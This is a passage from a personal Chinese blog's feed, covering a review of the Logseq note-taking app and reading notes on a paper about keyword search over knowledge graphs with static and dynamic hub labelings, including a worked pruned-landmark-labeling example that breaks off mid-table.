年，准备考研复试的专业课时，我开始尝试幕布这个在线笔记软件。对于整理概念性的知识，幕布绝对是一个非常强大的工具。将一门课，一本书化为一个个知识点，并通过层次表达它们的关系，最后还能生成相应的思维导图，这个笔记体验真的是太美妙了。</p><p>美中不足的是，幕布并<strong>不支持公式和代码块的渲染</strong>，这对于有大量公式代码笔记需求的我来说有点遗憾。</p><h2 id="logseq">Logseq</h2><p>最近，在 GitHub 上发现了一款开源笔记应用，<a href="https://github.com/logseq/logseq" target="_blank" rel="noopener">Logseq</a>，个人感觉比较完美的满足了我的几点需求：</p><ol type="1"><li>支持 Markdown，并且所见即所得 ；</li><li>支持公式和代码块渲染；</li><li>保持笔记的私密性。</li></ol><p>下一部分，我将聊一聊我对 Logseq 的使用体验。</p><h1 id="logseq-初体验">Logseq 初体验</h1><h2 id="快速上手">快速上手</h2><p>使用 Logseq 非常简单，只需要你拥有一个浏览器，一个 GitHub 账户及笔记仓库。</p><div class="note info"><p>如果要保持你笔记的私密性，你可以创建一个<strong>私有</strong>的 GitHub 笔记仓库供 Logseq 存储数据文件。</p></div><p>当你，准备好上述要求，只需访问 <a href="https://logseq.com/" target="_blank" rel="noopener">https://logseq.com/</a> ，并使用 Github 登录授权，设置好笔记仓库，就可以开始你的笔记了。</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/daily-notes.PNG" alt="Logseq默认界面" /><figcaption>Logseq默认界面</figcaption></figure><p>登陆后，Logseq 会默认创建一个标题为今天的文件，你可以直接在此开始笔记。如果要创建新的页面，你可以在左上的搜索框输入新页面的文件名，并选择相应的下拉选项，完成创建。</p><h2 id="体验感受">体验感受</h2><p>从我的使用体验来说，Logseq 的手感是十分惊艳的。主要有如下几点：</p><ul><li><strong>快速笔记</strong><ul><li>十分类似于幕布的高效的笔记手感</li></ul></li><li><strong>数据完全属于你</strong><ul><li>Logseq 不保存你的任何数据。它在运行过程中，仅仅将你的数据缓存在浏览器的本地缓存中，并与你设定的 GitHub 仓库同步。</li></ul></li><li><strong>强大的页面引用、块引用</strong><ul><li>受 <a href="https://roamresearch.com/" target="_blank" rel="noopener">Roam</a> 启发</li><li>这建立了独立的笔记文件之间的联系，更利于笔记整合成知识库。</li></ul></li><li><strong>支持 Markdown，并且所见即所得</strong></li></ul><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/markdown-support.png" alt="Logseq 中 Markdown 支持情况" /><figcaption>Logseq 中 Markdown 支持情况</figcaption></figure><ul><li><strong>丰富的命令</strong><ul><li>键入 <code>/</code> （slash 键），你会发现一个全新的大陆：可以创建待办事项、插入页面引用或者块引用，甚至还能在其中插入一个画图的页面。</li></ul></li></ul><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/commands.PNG" alt="Logseq 中的命令" /><figcaption>Logseq 中的命令</figcaption></figure><h2 id="使用场景">使用场景</h2><p>在我看来，Logseq 具有非常丰富的使用场景：</p><ul><li><strong>自由写作</strong>：你可以在 Logseq 写下任何你思想的火花，供日后整理。</li><li><strong>待办事项</strong>：Logseq 提供了比较丰富的待办事项功能，包括创建待办事项，设置事项优先级，设定 deadline 和 schedule。</li><li><strong>知识整理</strong>：这也许是 Logseq 最核心的使用方式之一。</li><li>...（也许还有更多）</li></ul><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/deadline-and-schedule.png" alt="Logseq 的 deadline 和 schedule" /><figcaption>Logseq 的 deadline 和 schedule</figcaption></figure><h1 id="从内联到外联">从内联到外联</h1><p>传统的笔记软件，通常把笔记独立为一个一个文件，关注一个文件内的内在联系，而忽视了不同笔记之间的联系。</p><p>Logseq 受 Roam 启发，将不同的笔记文件通过<strong>页面引用</strong>联系起来，从而更好地构建自己的知识网络。</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/KG.PNG" alt="Logseq 图谱示例" /><figcaption>Logseq 图谱示例</figcaption></figure><p>近期，新版的幕布也上线了 <code>@文件名</code> 引用不同的笔记，想必也是受到类似应用的启发。</p><p>由此可见，笔记软件正在从内联走向外联，越来越符合对知识整理的需求。</p><h1 id="不足">不足</h1><p>目前来说，Logseq 还存在许多不足：</p><ul><li>Logseq 还处在快速迭代阶段，很多功能存在不稳定的可能；</li><li>相关的文档稀少，对新手不太友好；</li></ul><p>但我相信，开源社区的支持会使得它更加完善。</p>]]></content>
        <author>
            <name><![CDATA[CosmosNing的个人博客]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://cosmosning.github.io/2020/10/08/notes-of-keyword-search-knowledge-2020/</id>
        <title><![CDATA[Keyword Search over Knowledge Graphs via Static and Dynamic Hub Labelings 阅读笔记]]></title>
        <updated>2021-05-14T12:17:25+08:00</updated>
        <link href="https://cosmosning.github.io/2020/10/08/notes-of-keyword-search-knowledge-2020/"/>
        <content type="text/html" src="https://cosmosning.github.io/2020/10/08/notes-of-keyword-search-knowledge-2020/"><![CDATA[<h1 id="highlights">Highlights</h1><ul><li><strong>Static Hub Labelings</strong></li><li><strong>Dynamic Hub Labelings</strong></li></ul><h1 id="what">What？</h1><h2 id="problem">Problem</h2><p>一种常见的图数据上的关键词查询的方法是，将每一个关键词与图上的一个顶点匹配，并且从中抽取出包含这些匹配顶点的最小权重的树（这种树被称为 <em>minimum-weight Steiner trees</em>）。更规范地说，给定一个有权边的数据图和一个关键词查询，首先对于每一个关键词，在图中找到与之匹配的所有顶点，形成一个匹配集；然后，在图中找到一个扩展匹配集的树，该树对于每一个匹配集，至少包含其中的一个顶点，并且总边权重最小。这个优化问题叫做 <em>group Steiner tree (GST) problem</em> 。</p><div class="note info"><p>数据图中的边也可以被关键词匹配。我们可以通过 <em>graph subdivision</em> 将边匹配转换为点匹配，之后使用点匹配的方式处理该匹配就行了。</p></div><h2 id="contributions">Contributions</h2><ul><li>设计了一个质量有保证的近似算法，能够在毫秒级内，从百万级大小的知识图谱中返回不错的结果。</li><li>设计了动态、静态 HL，提高了总体的效率。</li></ul><h1 id="why">Why？</h1><p>知识图谱越来越大，现存的算法太慢了。</p><h1 id="how">How？</h1><h2 id="problem-formulation">Problem Formulation</h2><ul><li><strong>知识图谱（<em>KG</em>）</strong>：规范的，知识图谱是一个简单的无向图 <span class="math inline">\(G=&lt;V,E&gt;\)</span> ，其中 <span class="math inline">\(V\)</span> 是包含 <span class="math inline">\(n\)</span> 个顶点的有限集合，用来指代实体（<em>entity</em>），而 <span class="math inline">\(E\subseteq V\times V\)</span> 是顶点无序对的有限集合，作为图的无向边，用来代表实体之间的关系（<em>relation</em>）。<ul><li><strong>边权重</strong>：定义一个权重函数 <span class="math inline">\(\textrm{wt}:E\mapsto \mathbb{R}^{0+}\)</span> （<strong>小权重表示重要性大</strong>）。</li></ul></li><li><strong>图中术语</strong><ul><li><span class="math inline">\(\textrm{len}(p)\)</span> ：对于一条路径 <span class="math inline">\(p\)</span> ，它的<strong>长度</strong>是路径中所有边的权重之和。</li><li><span class="math inline">\(\textrm{dist}(u,v)\)</span> ：在图 <span class="math inline">\(G\)</span> 中，连接 <span class="math inline">\(u\)</span> 、<span class="math inline">\(v\)</span> 的<strong>最短路径的长度</strong>。如果不存在，那么为 <span class="math inline">\(\infty\)</span> 。</li></ul></li><li><strong>关键词映射</strong>：定义一个获取函数 <span class="math inline">\(\textrm{hits}:\mathbb{K}\mapsto 2^V\)</span> ，它将关键词映射到顶点集 <span class="math inline">\(V\)</span> 的子集。</li><li><strong>关键词查询</strong>：一个<strong>关键词查询</strong> <span class="math inline">\(Q\subseteq \mathbb{K}\)</span> 是一个关键词的有限集合。<ul><li>给定一个含有 <span class="math inline">\(g\)</span> 个关键词的查询 <span class="math inline">\(Q=\{k_1,k_2,\dots,\ k_g\}\)</span> ，将 <span class="math inline">\(\textrm{hits}(k_i)\)</span> 简记为 <span class="math inline">\(K_i\)</span> （<span class="math inline">\(1\le i\le g\)</span>），并称之为<strong>关键词顶点</strong>。</li><li>给定一个图 <span class="math inline">\(G=&lt;V,E&gt;\)</span> ，在 <span class="math inline">\(G\)</span> 上关于 <span class="math inline">\(Q\)</span> 的结果是一个 <em>group Steiner tree (GST)</em> ，记作 <span class="math inline">\(T=&lt;V_T,E_T&gt;\)</span> ，满足以下条件<ul><li><span class="math inline">\(V_T\subseteq V,E_T\subseteq E\)</span> ，并且 <span class="math inline">\(T\)</span> 是一棵树；</li><li><span class="math inline">\(V_T\)</span> 包含来自每一个 <span class="math inline">\(K_i\)</span> （<span class="math inline">\(1\le i\le g\)</span>）中的至少一个顶点，也就是 <span class="math inline">\(V_T\cap K_i \ne \emptyset\)</span> ；</li><li>树的权重（定义为 <span class="math inline">\(\textrm{WT}(T)=\sum_{e\in E_T}\textrm{wt}(e)\)</span>）最小</li></ul></li></ul></li></ul><h2 id="overview-of-two-algorithm">Overview of Two Algorithm</h2><p>第一个算法 <em>KeyKG</em> 为每一个关键词选取匹配的顶点，并且找到对应的树。对于 <span class="math inline">\(g\)</span> 个关键词，<em>KeyKG</em> 是一个 <span class="math inline">\((g-1)\)</span> - 近似算法，也就是说，一个 GST 的边权值的总和至多是最小权重的 <span class="math inline">\((g-1)\)</span> 倍。获得这样的近似效果要归功于匹配顶点集的选择和利用最短路径树的构造。为了更高效的在线计算距离和最短路径，该文章设计了一个 HL ，这个 HL 使用了一种全新的基于 <em>betweenness centrality</em> 的启发式方法改善了现存的 <em>pruned landmark labeling</em> 。传统的，这种 HL 是静态的，因为它是离线生成的，并且对查询是不变的。在巨大的知识图谱中， 使用静态 HL 的 <em>KeyKG</em> 算法至少比目前先进的算法快一个数量级，并且所得结果的质量也较高。</p><p>第二个算法 <em>KeyKG+</em> 通过使用一种新颖的 HL 扩展了 <em>KeyKG</em> 算法。这里所提出的 HL 是动态的，因为它是在处理一个具体的查询时，通过倒排和聚集某些查询相关的静态标签，而动态生成的。它减少了 KeyKG 算法中的重复操作（这些重复操作是指使用传统静态 HL 计算顶点集的距离）。尽管在线生成会花费额外的时间，使用动态 HL 为总体效率带来了几个数量级的提高。</p><h2 id="keykg-with-static-hl">KeyKG With Static HL</h2><h3 id="algorithm-keykg">Algorithm KeyKG</h3><h4 id="algorithm-explained">Algorithm Explained</h4><p>如下图<strong>算法 1</strong> 所示，<em>KeyKG</em> 在知识图谱中找到一个 <em>GST</em> ，这个 <em>GST</em> 是由 <span class="math inline">\(g\)</span> 个关键词集合扩展而来。简而言之， <em>KeyKG</em> 首先贪婪地选择一组相互靠近的一组关键词顶点集合（记作 <span class="math inline">\(U_x\)</span>），这组关键词顶点集合包含了来自每一个 <span class="math inline">\(K_i\)</span> （<span class="math inline">\(1\le i\le g\)</span>）中的一个顶点（<strong>Line 1 - 8</strong>）。然后，<em>KeyKG</em> 贪婪地找到一个由 <span class="math inline">\(U_x\)</span> 扩展而来的 <em>GST</em> （记作 <span class="math inline">\(T_{u_{min}}\)</span>），这个过程是通过迭代地扩展最短路径而得到的（<strong>Line 9 - 18</strong>）。</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/Algo1.PNG" alt="算法 1" /><figcaption>算法 1</figcaption></figure><p>具体的，对于每一个 <span class="math inline">\(v_1 \in K_1\)</span> （<strong>Line 1</strong>），<em>KeyKG</em> 从每一个 <span class="math inline">\(K_i\)</span> 找到一个顶点 <span class="math inline">\(v_i\)</span> ，它距离 <span class="math inline">\(v_1\)</span> 的距离最短（<strong>Line 2 - 4</strong>）。令 <span class="math inline">\(U_{v_1}\)</span> 为所有这样的顶点 <span class="math inline">\(v_i\)</span> （包括 <span class="math inline">\(v_1\)</span>）的的集合，并且令 <span class="math inline">\(W_{v_1}\)</span> 为它们到 <span class="math inline">\(v_1\)</span> 的距离之和（<strong>Line 5 - 6</strong>）。令 <span class="math inline">\(x\in K_1\)</span> 为 <span class="math inline">\(K_1\)</span> 中 <span class="math inline">\(W_{v_1}\)</span> 最小的顶点（<strong>Line 8</strong>）。</p><div class="note info"><p><strong>扩展 <span class="math inline">\(U_x\)</span> 所得到的 GST 可能有较小的权重</strong></p><ul><li>因为 <span class="math inline">\(U_x\)</span> 包含了来自每一个 <span class="math inline">\(K_i\)</span> （<span class="math inline">\(1\le i\le g\)</span>）中的一个顶点，并且这些顶点相对而言十分接近，所以扩展 <span class="math inline">\(U_x\)</span> 所得到的 GST 可能有较小的权重。</li></ul></div><p><strong>算法 1</strong> 剩下的部分以每一个 <span class="math inline">\(u\in U_x\)</span> 构造一个 <em>GST</em> <span class="math inline">\(T_u\)</span> ，并且从这 <span class="math inline">\(|U_x|\)</span> 棵 <em>GST</em> 中找出权重最小的那一个。具体的，每一棵 <span class="math inline">\(T_u\)</span> 被初始化为只含有一个单一的顶点 <span class="math inline">\(u\)</span> （<strong>Line 9 - 10</strong>）。然后，不断迭代直至 <span class="math inline">\(T_u\)</span> 扩展了 <span class="math inline">\(U_x\)</span> 中的所有顶点（<strong>Line 11</strong>）：从 <span class="math inline">\(T_u\)</span> 中选取一个点 <span class="math inline">\(s_{\textrm{min}}\)</span> ，从 <span class="math inline">\(U_x-T_u\)</span> 中选一个点 <span class="math inline">\(t_{\textrm{min}}\)</span> ，它们之间的距离最短（<strong>Line 12</strong>）。接着，找到 <span class="math inline">\(s_{\textrm{min}}\)</span> 和 <span class="math inline">\(t_{\textrm{min}}\)</span> 之间的最短路径，并将路径上的顶点和边加入 <span class="math inline">\(T_u\)</span> （<strong>Line 13 -14</strong>）。令 <span class="math inline">\(u_{\textrm{min}}\in U_x\)</span> 表示一个顶点，满足它所对应的 <span class="math inline">\(T_u\)</span> 的权重最小（<strong>Line 17</strong>）。最终 <em>KeyKG</em> 将 <span class="math inline">\(T_{u_\textrm{min}}\)</span> 作为结果返回。</p><div class="note default"><p><strong>算法 1 中的 <code>getD</code> 和 <code>getSP</code></strong></p><ul><li><code>getD</code> ：计算两个顶点之间的距离。</li><li><code>getSP</code>：计算两个顶点之间的最短路径。</li></ul></div><h4 id="running-example">Running Example</h4><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG 执行的例子" /><figcaption>KeyKG 执行的例子</figcaption></figure><p>举个例子，如上图，给定一个查询 <span class="math inline">\(Q=\{k_1,k_2,k_3\}\)</span> ，则 <span class="math inline">\(K_1=\{B,F\},\;K_2=\{E\},\;K_3=\{C,D\}\)</span> 。</p><ul><li>对于 <span class="math inline">\(B\in K_1\)</span> ，<span class="math inline">\(E\)</span> 必选；由于 <span class="math inline">\(\textrm{dist}(B,C) = 1 &lt; 1.6 = \textrm{dist}(B,D)\)</span> ，所以选择 <span class="math inline">\(C\)</span> 。故 <span class="math inline">\(U_B = \{B,E,C\}\)</span> 。</li><li>对于 <span class="math inline">\(B\in K_2\)</span> ，<span class="math inline">\(E\)</span> 必选；由于 <span class="math inline">\(\textrm{dist}(F,C) = 1.1 &lt; 1.7 = \textrm{dist}(F,D)\)</span> ，所以选择 <span class="math inline">\(C\)</span> 。故 <span class="math inline">\(U_B = \{F,E,C\}\)</span> 。</li></ul><p>下面计算各自的权重之和：</p><ul><li>对于 <span class="math inline">\(U_B\)</span> ，<span class="math inline">\(W_B=\textrm{dist}(B,E)+\textrm{dist}(B,C) = 0.8+1 = 1.8\)</span></li><li>对于 <span class="math inline">\(U_F\)</span> ，<span class="math inline">\(W_B=\textrm{dist}(F,E)+\textrm{dist}(F,C) = 0.9+1.1 = 2\)</span></li></ul><p>由于 <span class="math inline">\(W_B &lt; W_F\)</span> ，故 <span class="math inline">\(x = B\)</span> 。</p><p>接下来生成 <em>GST</em> ：</p><ul><li><span class="math inline">\(T_B\)</span><ul><li>初始化 <span class="math inline">\(T_B\)</span> 中仅有一个顶点 <span class="math inline">\(B\)</span></li><li>令 <span class="math inline">\(s_{\textrm{min}} = B\)</span> ，则 <span class="math inline">\(t_{\textrm{min}} = E\)</span> ，因为 <span class="math inline">\(\textrm{dist}(B,E) &lt; \textrm{dist}(B,C)\)</span></li><li>令 <span class="math inline">\(t_{\textrm{min}} = C\)</span> ，则 <span class="math inline">\(s_\textrm{min} = E\)</span> ，因为 <span class="math inline">\(dist(E,C) &lt; \textrm{dist}(B,C)\)</span></li><li>再求出相关最短距离的路径，将路径上的顶点和边加入 <span class="math inline">\(T_B\)</span> ，即可得到图 <strong>KeyKG 执行的例子</strong> 中的 <span class="math inline">\(T_B\)</span></li></ul></li><li><span class="math inline">\(T_E\)</span> ：类似 <span class="math inline">\(T_B\)</span> 分析可得</li><li><span class="math inline">\(T_C\)</span> ：类似 <span class="math inline">\(T_B\)</span> 分析可得</li></ul><h3 id="static-hl">Static HL</h3><h4 id="why-we-need-hub-labeling">Why we need Hub Labeling？</h4><p>由上述介绍可知，<em>KeyKG</em> 依赖于两个子函数 <code>getD</code> 和 <code>getSP</code> 。在巨大的知识图谱中，一种直观的在线的实现这些子函数的方法（例如 Dijkstra 算法）的执行时间太长了；另一方面，离线生成每对顶点之间的距离和最短路径的空间开销十分大。为了权衡时空开销，这篇文章使用了 Hub Labeling ，一种离线生成的索引结构。</p><h4 id="basic-concept">Basic Concept</h4><p>一个静态的 HL 是一个图上的离线生成的索引结构。规范的说，对于一个图 <span class="math inline">\(G=&lt;V,E&gt;\)</span> ，一个静态的 HL ，可以看作一个函数 <span class="math inline">\(L:V\mapsto 2^V\)</span> ，它将顶点映射到顶点的集合（称作 <em>hub</em>），并且满足下列条件：</p><ul><li><span class="math inline">\(\forall u,v\in V\)</span> ，并且 <span class="math inline">\(u，v\)</span> 在 <span class="math inline">\(G\)</span> 中是连通的，<span class="math inline">\(\exists h\in L(u)\cap L(v)\)</span> ，使得 <span class="math inline">\(h\)</span> 在 <span class="math inline">\(u,v\)</span> 之间的最短路径上</li></ul><div class="note info"><p>对于 <span class="math inline">\(\forall v\in V\)</span> ， <span class="math inline">\(L(v)\)</span> 称为顶点 <span class="math inline">\(v\)</span> 的<strong>标签</strong>。</p></div><h4 id="supporting-for-computing-getd-but-not-getsp">Supporting For Computing <code>getD</code> but not <code>getSP</code></h4><p>在标准的索引结构中，每一个 <span class="math inline">\(L(v)\)</span> 是一个列表，其中包含按标识符排序的 hubs 。对于每一个 <span class="math inline">\(h\in L(v)\)</span> ，<span class="math inline">\(\textrm{dist}(v,h)\)</span> 也会预先计算出来并保存。这样我们就可以通过如下公式计算 <code>getD</code> ： <span class="math display">\[\textrm{getD}(u,v)=\begin{cases}\underset{h\in L(u)\cap L(v)}{min} \textrm{dist}(u,h) + \textrm{dist}(v,h) &amp; L(u)\cap L(v) \ne \emptyset\\\infty &amp; L(u)\cap L(v) = \emptyset\\\end{cases}\]</span> 其中，<span class="math inline">\(\textrm{dist}(u,h)\)</span> 和 <span class="math inline">\(\textrm{dist}(v,h)\)</span> 分别存储在 <span class="math inline">\(L(u)\)</span> 和 <span class="math inline">\(L(v)\)</span> 中。</p><p>但是，无法计算 <code>getSP</code></p><h4 id="improvement-in-construction">Improvement in Construction</h4><p><strong>动机</strong></p><p>从 <span class="math inline">\(\textrm{getD}(u,v)\)</span> 计算公式来看，当索引标签较小时，<code>getD</code> 的在线计算会更快。但是，最小化索引标签的平均大小是一个 NP-Hard 问题，并且具有对数不可近似性（<em>logarithmic inapproximability</em>）。给定一个图，有很多不同的启发式的方法能够构建合理的较小的索引标签。在其他的方法中，<em>pruned landmark labeling</em> (PLL) 是一个非常热门的实现方法，它利用了 Dijkstra 算法，并且能够高效的剪枝达到缩小索引标签大小的目的。</p><p><strong>算法</strong></p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/Algo2.PNG" alt="Algorithm 2" /><figcaption>Algorithm 2</figcaption></figure><p>如<strong>算法 2</strong> 所示，标准的 PLL 基本流程是执行 Dijkstra 算法 <span class="math inline">\(n\)</span> 次，其中 <span class="math inline">\(n\)</span> 为顶点的个数（Line 3 - 24），并且在此过程中迭代地扩展顶点标签（Line 4，Line 12）。记 <span class="math inline">\(i\)</span> 次迭代后 <span class="math inline">\(v\)</span> 的标签为 <span class="math inline">\(L_i(v)\)</span> 。在第 <span class="math inline">\(i\)</span> 次迭代，Dijkstra 算法从一个不同的顶点 <span class="math inline">\(v_i\in V\)</span> 出发（Line 7），访问其他顶点并且计算它们与 <span class="math inline">\(v_i\)</span> 之间的距离，存储到 <span class="math inline">\(d\)</span> 中（Line 14 - 15），再将 <span class="math inline">\(v_i\)</span> 加入到它们的索引标签中。</p><div class="note info"><p><strong>关于剪枝</strong></p><ul><li>由于一些顶点 <span class="math inline">\(u\)</span> 没有被访问到，所以它们的标签可以剪掉。</li><li>当 <span class="math inline">\(u\)</span> 与 <span class="math inline">\(v_i\)</span> 的距离可由构造好的 <span class="math inline">\(L_{i-1}\)</span> 标签计算得到，也就是 Line 11 的条件为假，那么会发生剪枝。</li></ul></div><p><strong>改进：Betweenness Centrality</strong></p><p>我们的目标是能够做更多剪枝来提高整个系统的性能。具体的，我们想要迭代早期构造的索引标签能够支持计算更多对顶点之间的距离，这样在后期的迭代过程中，就可以更频繁地发生剪枝操作。直观地，这可以通过这种方式实现，即在 Dijkstra 算法迭代的早期，选择那些许多最短路径都经过的顶点作为起始顶点。为了实现这个想法，原始的 PLL 实现方式是利用一些启发式的方法，对这些起始顶点按照其度数降序排列，因为高度数的顶点更有可能出现在许多顶点对之间的最短路径上。与传统方法不同，我们基于 <em>betweenness centrality</em> 对它们降序排序。顶点 <span class="math inline">\(v\)</span> 的 <em>betweenness centrality</em> 定义如下： <span class="math display">\[\textrm{bc}(v)=\underset{s,\;t\in V\backslash\ \{v\}}{\sum}\frac{\sigma_{st}(v)}{\sigma_{st}}\]</span> 其中，<span class="math inline">\(\sigma_{st}\)</span> 表示顶点 <span class="math inline">\(s,\;t\)</span> 之间最短路径的个数，<span class="math inline">\(\sigma_{st}(v)\)</span> 表示上述路劲中经过顶点 <span class="math inline">\(v\)</span> 的。</p><div class="note info"><p><strong>图上任意两个顶点之间的最短路径不止一条</strong>，因为可能存在<strong>最小权值相等但是路径不同</strong>的情况。</p></div><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG 执行的例子" /><figcaption>KeyKG 执行的例子</figcaption></figure><div class="note default"><p>举个例子，如上图中的图。可以用 Floyd 算法计算出任意两顶点之间的最短距离和路径。之后依据这个信息和 <em>betweenness centrality</em> 的定义可得：</p><ul><li><span class="math inline">\(\textrm{bc}(A) = 7\)</span></li><li><span class="math inline">\(\textrm{bc}(B)=4\)</span></li><li><span class="math inline">\(\textrm{bc}(C)=\textrm{bc}(D)=\textrm{bc}(E)=\textrm{bc}(F)=0\)</span></li></ul><p>但是，论文中用了 [4] （<strong>TODO</strong>）中的近似算法来缩短计算时间。</p></div><p><strong>构造 Static HL 的例子</strong></p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG 执行的例子" /><figcaption>KeyKG 执行的例子</figcaption></figure><p>假设图的结构如上图所示。</p><p>首先初始化 <span class="math inline">\(L_0(v)\)</span> ：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_0(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_0(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_0(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_0(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_0(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_0(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><p>接着按照 <em>betweenness centrality</em> 对顶点降序排序，顺序为 <strong>A, B, C, D, E, F</strong>；</p><hr /><p>进入第一次循环：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td></tr></tbody></table><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(d[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><strong>0</strong></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td></tr></tbody></table><p>PQ 优先队列为：</p><table><thead><tr class="header"><th style="text-align: center;">A</th><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">队头（队尾）</td><td style="text-align: center;"></td></tr></tbody></table><hr /><p>进入内层 while 循环，</p><p>从 PQ 中弹出 <span class="math inline">\(A\)</span> 赋给 <span class="math inline">\(u\)</span> ，即 <span class="math inline">\(u=A\)</span> ；</p><p>将 <span class="math inline">\(visit[u]\)</span> 置 1，则：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><strong>1</strong></td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td></tr></tbody></table><p>利用 <span class="math inline">\(L_0\)</span> 计算 <span class="math inline">\(\textrm{getD}(v_1,u)\)</span> ，即计算 <span class="math inline">\(\textrm{getD}(A,A)\)</span> 。由于 <span class="math inline">\(L_0(A)=\emptyset\)</span> ，故 <span class="math inline">\(L_0(A)\cap L_0(A) = \emptyset\)</span>，所以 <span class="math inline">\(\textrm{getD}(A,A) = \infty\)</span> （利用 <span class="math inline">\(\textrm{getD}\)</span> 的公式可得）。</p><p>由于 <span class="math inline">\(\textrm{d}[u] = \textrm{d}[A] = 0 &lt; \textrm{getD}(v_1,u)\)</span> ，故 Line 11 的条件满足，进入条件体。</p><p><span class="math inline">\(L_i(u)\leftarrow L_{i-1}(u)\cup\{v_i\}\)</span> ，使得索引变化为：</p><table><colgroup><col style="width: 42%" /><col style="width: 11%" /><col style="width: 11%" /><col style="width: 11%" /><col style="width: 11%" /><col style="width: 11%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><hr /><p>在接下来的对 <span class="math inline">\(u=A\)</span> 未被访问的邻居顶点执行操作。</p><p>访问第一个邻居 <span class="math inline">\(B\)</span> 后，<span class="math inline">\(d\)</span> 变化如下：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(d[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[B]\)</span></th><th style="text-align: center;"><span class="math 